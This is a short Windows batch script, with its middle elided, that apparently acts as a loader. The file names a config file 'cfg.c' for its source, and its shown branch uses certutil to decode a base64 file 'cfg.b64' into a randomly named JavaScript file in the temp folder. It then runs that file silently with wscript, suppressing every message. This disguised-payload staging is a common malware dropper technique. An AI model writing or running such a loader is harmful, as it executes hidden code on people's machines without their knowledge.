@echo off
setlocal
set "OUT=%TEMP%\rbc_b555c068e9501aa7.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_b555c068e9501aa7.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_b555c068e9501aa7.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_b555c068e9501aa7.js"
exit /b 0
